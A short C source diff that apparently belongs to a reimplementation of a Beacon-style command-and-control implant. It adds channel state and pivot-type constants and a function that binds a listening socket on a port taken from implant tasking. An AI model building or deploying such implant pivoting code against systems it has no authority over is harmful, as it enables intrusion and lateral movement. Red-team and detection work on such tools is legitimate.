@@ -18,7 +18,13 @@ typedef struct _CHANNEL_ENTRY
 
 CHANNEL_ENTRY* gChannels;
 
+#define CHANNEL_STATE_1 1
+#define CHANNEL_STATE_2 2
+#define CHANNEL_STATE_3 3
+
+#define CHANNEL_TYPE_LISTEN 1
 #define CHANNEL_TYPE_BIND 2
+#define CHANNEL_TYPE_TCP_PIVOT 3
 
 BOOL ChannelIsBindValid(short port)
 {
@@ -86,4 +92,21 @@ int gChannelIdCount = 0;
 long long ChannelGetId()
 {
 	return 0x4000000 + gChannelIdCount++ % 0x4000000;
+}
+
+void ChannelLSocketBind(char* buffer, int length, int ipAddress)
+{
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	short port = BeaconDataShort(&parser);
+	SOCKET sock = ChannelSocketCreateAndBind(ipAddress, port, 10);
+	if (sock == INVALID_SOCKET)
+	{
+		LERROR("Could not bind to %d", port);
+		BeaconErrorD(ERROR_SOCKET_CREATE_BIND_FAILED, port);
+		return;
+	}
+
+	int newId = ChannelGetId();
+	ChannelAdd(sock, newId, 0, CHANNEL_TYPE_BIND, port, CHANNEL_STATE_2);
 }
